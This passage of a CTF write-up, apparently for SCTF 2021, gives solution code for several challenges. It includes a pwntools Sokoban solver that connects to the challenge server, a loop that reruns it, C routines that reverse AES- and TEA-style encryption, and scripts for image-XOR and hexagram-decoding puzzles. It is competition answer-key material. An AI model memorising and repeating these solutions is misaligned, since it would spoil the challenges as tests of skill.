used_storaged = [0] * 4

def isprime(n):
    i = 2
    while i * i < n:
        if n % i == 0:
            return False
        i += 1
    return True

def generate_map(content):
    arr = []
    cur = 0
    for i in range(0, len(content)):
        if content[i] != " ":
            continue
        # print(s[cur:i][1:])
        arr.append(int(content[cur:i][1:]))
        cur = i
        # print(cur, end = " :")
    arr.append(int(content[cur:][1:]))
    map = ['#'] * 400
    for i in range(0, 20):
        for j in range(0 ,20):
            if arr[20 * i + j] == -1:
                map[20 * i + j] = '$'
                continue
            if arr[20 * i + j] == -3:
                map[20 * i + j] = '.'
                continue
            if arr[20 * i + j] == -2:
                map[20 * i + j] = '@'
                continue
            if isprime(arr[20 * i + j]):
                map[20 * i + j] = '#'
            else:
                map[20 * i + j] = '_'
    return map

def judge(x, y, map):
    if map[20 * y + x] == '#' or map[20 * y + x] == '$' or map[20 * y + x] == '*' or map[20 * y + x] == '.':
        return False
    return True

def judge_1(x, y, map):
    if map[20 * y + x] == '#' or map[20 * y + x] == '$' or map[20 * y + x] == '*':
        return False
    return True

def judge_2(x, y, map):
    if map[20 * y + x] == '#' or map[20 * y + x] == '$' or map[20 * y + x] == '*' or map[20 * y + x] == '.':
        return False
    return True

def judge_pre(x, y, map):
    if map[20 * y + x] == '#' or map[20 * y + x] == '$' or map[20 * y + x] == '*' or map[20 * y + x] == '.':
        return False
    return True

def judge_connect(des_x, des_y, map):
    if judge(des_x, des_y, map) == False:
        return False
    cur_x = 0
    cur_y = 0
    for yy in range(0, 20):
        for xx in range(0 ,20):
            if map[yy * 20 + xx] == '@':
                cur_x = xx
                cur_y = yy
    queue = [addr(cur_x, cur_y)]
    check_map = [0] * 400
    while len(queue) > 0:
        cur_x = queue[0].x
        cur_y = queue[0].y
        queue.pop(0)
        check_map[cur_y * 20 + cur_x] = 1
        x_offset = [0, 0, -1, 1]
        y_offset = [-1, 1, 0, 0]
        for i in range(0, 4):
            next_x = cur_x + x_offset[i]
            next_y = cur_y + y_offset[i]
            if next_x < 0 or next_x > 19 or next_y < 0 or next_y > 19:
                continue
            if judge(next_x, next_y, map) and check_map[next_y * 20 + next_x] == 0:
                if next_x == des_x and next_y == des_y:
                    return True
                queue.append(addr(next_x, next_y))
                check_map[next_y * 20 + next_x] = 1
    return False

def map_update(cur_x, cur_y, destination, map):
    if destination == 'w':
        map[cur_y * 20 + cur_x] = '_'
        for j in range(0, 4):
            if cur_x == storage[j].x and cur_y == storage[j].y:
                map[cur_y * 20 + cur_x] = '.'
        cur_y -= 1
        if map[cur_y * 20 + cur_x] == '$' or map[cur_y * 20 + cur_x] == '*':
            if map[(cur_y - 1) * 20 + cur_x] == '.':
                map[(cur_y - 1) * 20 + cur_x] = '*'
            else:
                map[(cur_y - 1) * 20 + cur_x] = '$'
        map[cur_y * 20 + cur_x] = '@'
    if destination == 's':
        map[cur_y * 20 + cur_x] = '_'
        for j in range(0, 4):
            if cur_x == storage[j].x and cur_y == storage[j].y:
                map[cur_y * 20 + cur_x] = '.'
        cur_y += 1
        if map[cur_y * 20 + cur_x] == '$' or map[cur_y * 20 + cur_x] == '*':
            if map[(cur_y + 1) * 20 + cur_x] == '.':
                map[(cur_y + 1) * 20 + cur_x] = '*'
            else:
                map[(cur_y + 1) * 20 + cur_x] = '$'
        map[cur_y * 20 + cur_x] = '@'
    if destination == 'a':
        map[cur_y * 20 + cur_x] = '_'
        for j in range(0, 4):
            if cur_x == storage[j].x and cur_y == storage[j].y:
                map[cur_y * 20 + cur_x] = '.'
        cur_x -= 1
        if map[cur_y * 20 + cur_x] == '$' or map[cur_y * 20 + cur_x] == '*':
            if map[cur_y * 20 + cur_x - 1] == '.':
                map[cur_y * 20 + cur_x - 1] = '*'
            else:
                map[cur_y * 20 + cur_x - 1] = '$'
        map[cur_y * 20 + cur_x] = '@'
    if destination == 'd':
        map[cur_y * 20 + cur_x] = '_'
        for j in range(0, 4):
            if cur_x == storage[j].x and cur_y == storage[j].y:
                map[cur_y * 20 + cur_x] = '.'
        cur_x += 1
        if map[cur_y * 20 + cur_x] == '$' or map[cur_y * 20 + cur_x] == '*':
            if map[cur_y * 20 + cur_x + 1] == '.':
                map[cur_y * 20 + cur_x + 1] = '*'
            else:
                map[cur_y * 20 + cur_x + 1] = '$'
        map[cur_y * 20 + cur_x] = '@'
    return cur_x,cur_y


def BFS_box2storage(box_x, box_y, storage_x, storage_y, map):
    cur_x = box_x
    cur_y = box_y
    queue = [addr(cur_x, cur_y)]
    check_map = [0] * 400
    from_map = [addr(0, 0) for i in range(400)]
    flag = False #标识到达终点
    choose = -1
    while len(queue) > 0:
        if flag:
            break
        cur_x = queue[0].x
        cur_y = queue[0].y
        queue.pop(0)
        check_map[cur_y * 20 + cur_x] = 1
        x_offset = [0, 0, -1, 1]
        y_offset = [-1, 1, 0, 0]
        pre_offset = [1, -1, 1, -1]
        for i in range(0, 4):
            next_x = cur_x + x_offset[i]
            next_y = cur_y + y_offset[i]
            pre_x = cur_x
            pre_y = cur_y
            if x_offset[i] != 0:
                pre_x += pre_offset[i]
            if y_offset[i] != 0:
                pre_y += pre_offset[i]
            if next_x < 0 or next_x > 19 or next_y < 0 or next_y > 19 or pre_x < 0 or pre_x > 19 or pre_y < 0 or pre_y > 19:
                continue
            if judge_1(next_x, next_y, map) and judge_pre(pre_x, pre_y, map) and check_map[next_y * 20 + next_x] == 0:
                for j in range(0, 4):
                    if next_x == storage[j].x and next_y == storage[j].y:
                        from_map[20 * next_y + next_x].x = cur_x
                        from_map[20 * next_y + next_x].y= cur_y
                        flag = True
                        choose = j
                        break
                if flag == True:
                    break
                queue.append(addr(next_x, next_y))
                from_map[20 * next_y + next_x].x = cur_x
                from_map[20 * next_y + next_x]. y= cur_y
                ##########################################
                check_map[next_y * 20 + next_x] = 1
    #路径回溯部分
    if flag == False:
        print("boxs (%2d, %2d) no solver" % (box_x, box_y))
        exit(0)
    order = [addr(storage[choose].x, storage[choose].y)]
    cur_x = from_map[20 * storage[choose].y + storage[choose].x].x
    cur_y = from_map[20 * storage[choose].y + storage[choose].x].y
    while cur_x != 0 and cur_y != 0:
        order.append(addr(cur_x, cur_y))
        temp_cur_x = from_map[20 * cur_y + cur_x].x
        temp_cur_y = from_map[20 * cur_y + cur_x].y
        cur_x = temp_cur_x
        cur_y = temp_cur_y
    order = order[::-1]
    ## print debug information
    # for i in range(0, len(order)):
    #     print("-> (%2d,%2d) " % (order[i].x, order[i].y), end = "")
    # print("")
    used_storaged[choose] = 1
    return order


def BFS_cur2des(x, y, des_x, des_y, map):
    if judge_connect(des_x,des_y, map) == False:
        print("no connected")
        exit(0)
    cur_x = x
    cur_y = y
    queue = [addr(cur_x, cur_y)]
    check_map = [0] * 400
    from_map = [addr(0, 0) for i in range(400)]
    flag = False #标识到达终点
    while len(queue) > 0:
        if flag:
            break
        cur_x = queue[0].x
        cur_y = queue[0].y
        queue.pop(0)
        check_map[cur_y * 20 + cur_x] = 1
        x_offset = [0, 0, -1, 1]
        y_offset = [-1, 1, 0, 0]
        for i in range(0, 4):
            next_x = cur_x + x_offset[i]
            next_y = cur_y + y_offset[i]
            if next_x < 0 or next_x > 19 or next_y < 0 or next_y > 19 :
                continue
            if judge_2(next_x, next_y, map) and check_map[next_y * 20 + next_x] == 0:
                if next_x == des_x and next_y == des_y:
                    from_map[20 * next_y + next_x].x = cur_x
                    from_map[20 * next_y + next_x].y= cur_y
                    flag = True
                    break
                queue.append(addr(next_x, next_y))
                from_map[20 * next_y + next_x].x = cur_x
                from_map[20 * next_y + next_x]. y= cur_y
                ########################################
                check_map[next_y * 20 + next_x] = 1
    order = [addr(des_x, des_y)]
    cur_x = from_map[20 * des_y + des_x].x
    cur_y = from_map[20 * des_y + des_x].y
    while cur_x != 0 and cur_y != 0:
        order.append(addr(cur_x, cur_y))
        temp_cur_x = from_map[20 * cur_y + cur_x].x
        temp_cur_y = from_map[20 * cur_y + cur_x].y
        cur_x = temp_cur_x
        cur_y = temp_cur_y
    order = order[::-1]
    # for i in range(0, len(order)):
    #     print("-> (%2d,%2d) " % (order[i].x, order[i].y), end = "")
    solve = ""
    for i in range(0, len(order) - 1):
        if (order[i].x - order[i + 1].x) == 0:
            if (order[i].y - order[i + 1].y) == 1:
                solve += "w"
            else:
                solve += "s"
        else:
            if (order[i].x- order[i + 1].x) == 1:
                solve += "a"
            else:
                solve += "d"
    return solve

def do_it(map):
    cur_x = 10
    cur_y = 10
    for i in range(0, 20):
        for j in range(0 ,20):
            if map[20 * i + j] == '.':
                storage.append(addr(j ,i))
            if map[20 * i + j] == '$':
                boxs.append(addr(j, i))
    sol = ""
    # return
    for k in range(0, 4):
        solve = ""
        t = 0
        while t < 4:
            if used_storaged[t] == 0:
                order = BFS_box2storage(boxs[k].x, boxs[k].y, storage[t].x, storage[t].y, map)
                break
            t += 1
        for i in range(0, len(order) - 1):
            cur_des_x = order[i].x - order[i + 1].x + order[i].x
            cur_des_y = order[i].y - order[i + 1].y + order[i].y
            if cur_des_x == cur_x and cur_des_y == cur_y:
                if (order[i].x - order[i + 1].x) == 0:
                    if (order[i].y - order[i + 1].y) == 1:
                        solve += "w"
                        temp_des = "w"
                    else:
                        solve += "s"
                        temp_des = "s"
                else:
                    if (order[i].x- order[i + 1].x) == 1:
                        solve += "a"
                        temp_des = "a"
                    else:
                        solve += "d"
                        temp_des = "d"
                # cur_x = order[i].x
                # cur_y = order[i].y
                cur_x, cur_y = map_update(cur_x, cur_y, temp_des, map)
            else:
                # if i != 0:
                #     map[boxs[k].y * 20 + boxs[k].x] = '_'
                #     map[order[i].y * 20 + order[i].x] = '$'
                #     boxs[k].y = order[i].y
                #     boxs[k].x = order[i].x
                temp = BFS_cur2des(cur_x, cur_y, cur_des_x, cur_des_y, map)
                solve += temp
                for j in range(0, len(temp)):
                    cur_x, cur_y = map_update(cur_x, cur_y, temp[j], map)
                if (order[i].x - order[i + 1].x) == 0:
                    if (order[i].y - order[i + 1].y) == 1:
                        solve += "w"
                        temp_des = "w"
                    else:
                        solve += "s"
                        temp_des = "s"
                else:
                    if (order[i].x- order[i + 1].x) == 1:
                        solve += "a"
                        temp_des = "a"
                    else:
                        solve += "d"
                        temp_des = "d"
                # cur_x = order[i].x
                # cur_y = order[i].y
                cur_x, cur_y = map_update(cur_x, cur_y, temp_des, map)
        # map[boxs[k].y * 20 + boxs[k].x] = '_'
        # map[storage[cur_choose].y * 20 + storage[cur_choose].x] = '*'
        sol += solve
        # print(solve)
    # print(sol)
    return sol

def my_init():
    global boxs
    global storage
    global used_storaged
    boxs = copy.copy([])
    storage = copy.copy([])
    used_storaged = copy.copy([0] * 4)

if __name__ == "__main__":
    # p = process('./sycgame')
    context.log_level = "debug"
    p = remote("124.70.152.166", 1448)
    for i in range(0, 5):
        my_init()
        p.recvuntil("(Y/n)")
        p.send("Y\n")
        p.recvuntil("gift:\n")
        content = p.recvuntil("\n")[:-2]
        # print("*********************************")
        # print(content)
        content = content.decode()
        # print(content)
        map = generate_map(content)
        sol = do_it(map)
        print(sol)
        # p.interactive()
        p.recvuntil("Tell me sol:")
        p.send(sol)
        # print(p.recv())
    print('&' * 200)
   
    p.interactive()
```

loop.sh 脚本,通过这个脚本循环执行 exp 总能找到几次完全通过游戏的关卡，打开 out.txt, 搜索`&`搜到的第一个位置附近就有 flag
```Shell
#!/bin/bash
int=1
while(( $int<=1000 ))
do
    python3 exp.py >> out.txt
    let "int++"
    sleep 0.5
    echo "" >> out.txt
    echo "" >> out.txt
done
```

### exception cpp
```c
  int cArray[4][4];
    int wArray[4][4];
    uint32_t key[] = { 0x21667463,0x735F6F74,0x5F656D6F,0x636C6557 };
    uint32_t v[] = { 0,0,0,0 };
    uint8_t roundkeys[176] = { 0,0, };
    uint8_t key1[] = "Welcome_to_sctf!";
   // uint8_t plaintext[16] = { 0x53,0x1b,0xda,0x34,0x3b,0xea,0xdd,0x22,0xf3,0xc7,0xe5,0x17,0x96,0xd4,0x43,0xd3 };
    uint8_t plaintext[16] = {

         0xF2, 0x93, 0x55, 0xDA,
        0x48, 0xFC, 0xA2, 0x3C, 0x89, 0x63, 0x2E, 0x7F, 0x8D, 0xA4,
        0x6D, 0x4E
    };
    
    enc_next_ready(key1, roundkeys);
    ConvertToIntkey(roundkeys);

    addRoundKey(plaintext, roundkeys, 10);
    convertToIntArray(plaintext, cArray);
    deShiftRows(cArray);
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            plaintext[4 * i + j] = cArray[j][i];
        }
    }
    deSubBytes(plaintext);
    for (int round = 9; round >= 1; --round) {
        addRoundKey(plaintext, roundkeys, round);
        convertToIntArray(plaintext, cArray);
        deMixColumns(cArray);
        for (int i = 0; i < 4; ++i) {
            for (int j = 0; j < 4; ++j) {
                plaintext[4 * i + j] = cArray[j][i];
            }
        }
        SubBytes(plaintext);
        convertToIntArray(plaintext, cArray);
        shiftRows(cArray);
        for (int i = 0; i < 4; ++i) {
            for (int j = 0; j < 4; ++j) {
                plaintext[4 * i + j] = cArray[j][i];
            }
        }
        
    }
    
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            plaintext[4 * i + j] = cArray[j][i];
        }
    }


      for (int i = 0; i < 16; ++i)
           plaintext[i] = plaintext[i] ^ roundkeys[i] ^ 0x66;
      for (int i = 0; i < 16; ++i)
          printf("0x%x,", plaintext[i]);
      for (int i = 0; i < 4; ++i) {
          for (int j = 0; j < 4; ++j) {
              v[i] = (uint32_t )(plaintext[4 * i + j] << (8 * j)) | v[i];
          }
     }
      printf("\n");
    uint32_t  key2[] = { 0x21667463,0x735F6F74,0x5F656D6F,0x636C6557 };
    decrypt1(v, key2);
     for (int i = 0; i < 4; ++i) {
         for (int j = 0; j <4; ++j) {
             plaintext[4 * i + j] = (v[i] >> (8 * j) & 0xff);
         }
     }
     for (int i = 0; i < 16; ++i)
         printf("%c",plaintext[i]);
```

### os 
```c
  for(int k = 0xf ; k >= 0 ; k--){
      exchange1();
      exchange(k);
  
       for (int i = 0; i < 0x1000; i += 8) {
		uint32_t v[2];
		uint32_t  key[4] = { 0x11222233 ,0xAABBCCDD, 0x1a2b3c4d,0xcc1122aa };
		v[0] = *(uint32_t*)(d_e8 + i);
		v[1] = *(uint32_t*)(d_e8 + 4 + i);
		decrypt(v, key);
		//	printf("v0 == %lx v1== %lx",v[0],v[1]);
		*(uint32_t*)(d_e8 + i) = v[0];
		*(uint32_t*)(d_e8 + 4 + i) = v[1];
	}
	for (int i = 0; i < 0x1000; i += 8) {
		uint32_t v[2];
		uint32_t  key[4] = { 0x11222233 ,0xAABBCCDD, 0x1a2b3c4d,0xcc1122aa };
		v[0] = *(uint32_t*)(d_e0 + i);
		v[1] = *(uint32_t*)(d_e0 + 4 + i);
		decrypt1(v, key);
		//	printf("v0 == %lx v1== %lx",v[0],v[1]);
		*(uint32_t*)(d_e0 + i) = v[0];
		*(uint32_t*)(d_e0 + 4 + i) = v[1];
	}
  
  
  }
  
    unsigned char input[0x41] ={0};
    for(int i = 0 ; i < 0x20; ++i){
       for(uint8_t t1 = 0x30 ; t1 < 0x7e ; ++t1){
           d_2ec8 = t1 + i;
           for(int  j = 0 ; j < 0x80 ; ++j){
             uint8_t tmp = shencheng();
	    if((0[0x80 * i + j] == tmp)&&(j==0x7d)){
	        input[i] = t1;
	    }
           
           }
           
       
       
       }
    
    }
    
    for(int i = 0 ; i < 0x20; ++i){
       for(uint8_t t1 = 0x30; t1 < 0x7e ; ++t1){
           d_2ec8 = t1 + i;
           for(int j = 0 ; j < 0x80 ; ++j){
            uint8_t tmp = fakerandom();
	    if((d_e0[0x80 * i + j] == tmp)&&(j==0x7d)){
	        input[0x20 +i] = t1;
	    }
           
           }
           
       
       
       }
    
    }
    printf("%s",input);

```


## Misc
### fumo_xor_cli
远程连上会发现有两个部分不是图片，是彩色的9.其中第二个部分中包含一个链接
>  https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA

打开链接从文章最后中找到一张图片，图片中可以提取像素点为一张`133*100`的像素点图，然后再把远程的两个彩色部分的数据处理一下转换成另外两张图拼接成一张`133*100`的图和公众号中的文章的图提取的`133*100`图进行异或可以拿到一张带有flag字样的图然后反一下就能拿到flag了
```python
from PIL import Image,ImageOps

f2 = Image.open('21.png')
f1 = Image.open('26.png')
fufu = Image.open('fumo.png')
flag = Image.new('RGB', (133, 100))
for i in range(50):
    for j in range(133):
        c1 = f1.getpixel((j, i))
        c2 = fufu.getpixel((j, i))
        c = (c1[0] ^ c2[0], c1[1] ^ c2[1], c1[2] ^ c2[2])
        flag.putpixel((j, i), c)
for i in range(50):
    for j in range(133):
        c1 = f2.getpixel((j, i))
        c2 = fufu.getpixel((j, i + 50))
        c = (c1[0] ^ c2[0], c1[1] ^ c2[1], c1[2] ^ c2[2])
        flag.putpixel((j, i + 50), c)
flag = ImageOps.invert(flag)
flag = flag.transpose(Image.FLIP_LEFT_RIGHT)
flag.save('flag.png')

```

### This_is_A_tree

解压得到一个文件夹，每个文件夹下都有 left 子文件夹和 right 文件夹，还有一个 data 数据文件，当作二叉树处理，先序遍历所有结点得到的字符串是一个 base64, 解 base64 后面还有一个六十四卦解密得到 flag
```Python
import os

s = ""

def preorder(url):
    global s
    # print(open(url + "/data", "r").read(), end = "")
    s += open(url + "/data", "r").read()
    if os.path.exists(url + "/letf"):
        preorder(url + "/letf")
    if os.path.exists(url + "/Right"):
        preorder(url + "/Right")




if __name__ == "__main__":
    dir = "D:/CTF/2021/SCTF/78afbe21e9334e83a265e984a1aa9ddd"
    preorder(dir)
    print(s)
    # 师兑复损巽震晋姤大过讼噬嗑震恒节豫
    s='师兑复损巽震晋姤大过讼噬嗑震恒节豫'
    dic={'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇':  '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家  人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101',  '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'}
    li=[]
    k=0
    for i in range(len(s)):
        if k ==1:
            k=0
            continue
        try:
            li.append(dic[s[i]])
        except:
            t=''
            t=t+s[i]+s[i+1]
            li.append(dic[t])
            k=1
    ss=''.join(li)
    print(ss)
    enc=''
    for i in range(0,len(ss),8):
        enc+=chr(eval('0b'+ss[i:i+8]))
    print(enc)

```